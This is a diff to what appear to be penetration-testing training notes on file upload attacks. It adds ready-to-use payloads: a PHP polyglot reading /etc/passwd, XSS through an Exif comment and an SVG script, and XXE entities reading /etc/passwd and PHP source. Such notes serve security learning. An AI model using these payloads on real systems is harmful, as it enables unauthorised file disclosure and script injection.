@@ -8,5 +8,32 @@ However, even the most robust way of validating a file isn't foolproof. Special 
 ```nix
 exiftool -Comment="<?php echo 'START ' . file_get_contents('/etc/passwd') . ' END'; ?>" image.jpg -o polyglot.php
 ```
-## Alternative Usage
+## Chaining File Upload Vulnerabilities with XSS and XXE
+<!--  @TODO: Transfer these to XSS and XXE, and create a new document named "Chaining with File Upload" detailing this exploits. -->
 The technique can also be used to introduce different vulnerabilities via file upload. These includes XSS, XXE, or DoS.
+### XSS via Exif Comment
+```nix
+exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
+```
+### XSS via SVG
+Save the following as `HTB.svg` and upload it.
+```svg
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
+    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
+    <script type="text/javascript">alert(window.origin);</script>
+</svg>
+```
+### XXE
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<svg>&xxe;</svg>
+```
+XXE can also be used to read source code in PHP web applications using the following:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<svg>&xxe;</svg>
+```
